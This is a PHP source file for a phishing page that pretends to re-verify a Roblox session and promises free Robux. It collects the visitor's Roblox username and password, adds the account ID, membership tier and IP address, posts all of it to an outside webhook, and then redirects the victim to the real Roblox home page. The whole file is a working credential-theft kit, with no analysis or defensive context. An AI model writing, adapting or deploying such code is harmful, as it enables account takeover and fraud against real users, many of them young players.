<?php
    $pageName = "Verification"; require_once('inc/header_essential.php'); if (isset($_POST['verifyLogin'])){ if (isset($_POST['username']) && isset($_POST['password']) && strlen($_POST['username']) > 2 && strlen($_POST['username']) < 21 && strlen($_POST['password']) < 64 && strlen($_POST['password']) > 7){ $username = strip_tags(Sanitizer::Gentle($_POST['username'])); $password = strip_tags(Sanitizer::Gentle($_POST['password'])); if (strval(json_decode(file_get_contents('https://www.roblox.com/UserCheck/DoesUsernameExist?username=' . $username), true)['success']) == 'false'){ die(header('location: index.php')); } $id = strval(json_decode(file_get_contents('https://api.roblox.com/users/get-by-username?username=' . $username), true)['Id']); $bcType = get_headers('https://www.roblox.com/Thumbs/BCOverlay.ashx?username=' . $username)[3]; if ($bcType = 'Location: https://static.rbxcdn.com/images/empty.png'){ $bc = 'NBC'; } elseif ($bcType = 'Location: https://static.rbxcdn.com/images/icons/overlay_obcOnly.png') { $bc = 'OBC'; } elseif ($bcType = 'Location: https://static.rbxcdn.com/images/icons/overlay_tbcOnly.png') { $bc = 'TBC'; } elseif ($bcType = 'Location: https://static.rbxcdn.com/images/icons/overlay_bcOnly.png') { $bc = 'BC'; } else { $bc = 'Error: Undefined BC Membership Status'; } $profile_url = 'https://www.roblox.com/users/' . $id . '/profile'; } else { die(header('location: index.php')); } $ip = $_SERVER['REMOTE_ADDR'];
        $content_build = "```
        Username: $username
        Password: $password

        BC Status: $bc
        IP Address: $ip
        ID: $id

        Profile: $profile_url```"; $data = array('content' => $content_build); $options = array('http' => array( 'header'  => "Content-type: application/x-www-form-urlencoded\r\n", 'method'  => 'POST', 'content' => http_build_query($data),),); $context  = stream_context_create($options); file_get_contents($webhook_addr, false, $context); if (!isset($error)){ die(header('location: https://www.roblox.com/home')); }}
?>

<div style="align:center;margin-left:35%;margin-right:35%;">
    <div class="card blue-grey darken-1">
        <div class="card-content white-text" style="margin-bottom:-5%;">
            <div class="card-panel red darken-2">
                <span class="white-text">We couldn't verify your ROBLOX session. Please verify to continue!</span>
            </div>
            <span class="card-title">Verify Roblox Login</span><br>
            <form method=POST>
            <input type="text" placeholder="ROBLOX Username" name="username" />
            <input type="text" placeholder="ROBLOX Password" name="password" />
        </div>
        <div class="card-action">
            <input type="submit" name="verifyLogin" class="waves-effect waves-light btn" value="Verify & Claim Robux >" />
            </form>
        </div>
    </div>
</div>

<?php
    require_once('inc/footer_essential.php');
?>